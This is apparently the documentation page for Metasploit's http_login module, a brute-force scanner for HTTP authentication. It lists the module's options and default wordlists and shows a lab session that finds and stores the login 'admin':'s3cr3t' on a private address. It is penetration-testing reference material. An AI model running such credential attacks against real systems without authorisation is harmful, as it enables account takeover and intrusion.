## Description

This module attempts to authenticate to an HTTP service. It is a brute-force login scanner that attempts to authenticate to a system using HTTP authentication.

## Verification Steps

1. Do: ```use auxiliary/scanner/http/http_login```
2. Do: ```set RHOSTS [IP]```
3. Do: ```set RPORT [PORT]```
4. Do: ```run```

## Scenarios

### Running the scanner
```
msf > use auxiliary/scanner/http/http_login
msf auxiliary(http_login) > show options

Module options (auxiliary/scanner/http/http_login):

   Name              Current Setting                                                           Required  Description
   ----              ---------------                                                           --------  -----------
   AUTH_URI                                                                                    no        The URI to authenticate against (default:auto)
   BLANK_PASSWORDS   false                                                                     no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                                                                         yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false                                                                     no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                                                                     no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                                                                     no        Add all users in the current database to the list
   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt      no        File containing passwords, one per line
   Proxies                                                                                     no        A proxy chain of format type:host:port[,type:host:port][...]
   REQUESTTYPE       GET                                                                       no        Use HTTP-GET or HTTP-PUT for Digest-Auth, PROPFIND for WebDAV (default:GET)
   RHOSTS                                                                                      yes       The target address range or CIDR identifier
   RPORT             80                                                                        yes       The target port (TCP)
   SSL               false                                                                     no        Negotiate SSL/TLS for outgoing connections
   STOP_ON_SUCCESS   false                                                                     yes       Stop guessing when a credential works for a host
   THREADS           1                                                                         yes       The number of concurrent threads
   USERPASS_FILE     /usr/share/metasploit-framework/data/wordlists/http_default_userpass.txt  no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false                                                                     no        Try the username as the password for all users
   USER_FILE         /usr/share/metasploit-framework/data/wordlists/http_default_users.txt     no        File containing users, one per line
   VERBOSE           true                                                                      yes       Whether to print output for all attempts
   VHOST
msf auxiliary(http_login) > set AUTH_URI /xampp/
AUTH_URI => /xampp/
msf auxiliary(http_login) > set RHOSTS 192.168.1.201
RHOSTS => 192.168.1.201
msf auxiliary(http_login) > set VERBOSE false
VERBOSE => false
msf auxiliary(http_login) > run

[*] Attempting to login to http://192.168.1.201:80/xampp/ with Basic authentication
[+] http://192.168.1.201:80/xampp/ - Successful login 'admin' : 's3cr3t'
[*] http://192.168.1.201:80/xampp/ - Random usernames are not allowed.
[*] http://192.168.1.201:80/xampp/ - Random passwords are not allowed.
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(http_login) >

msf auxiliary(http_login) > creds
Credentials
===========

host           origin         service        public  private  realm  private_type
----           ------         -------        ------  -------  -----  ------------
192.168.1.201  192.168.1.201  80/tcp (http)  admin   s3cr3t          Password

msf auxiliary(http_login) >
```










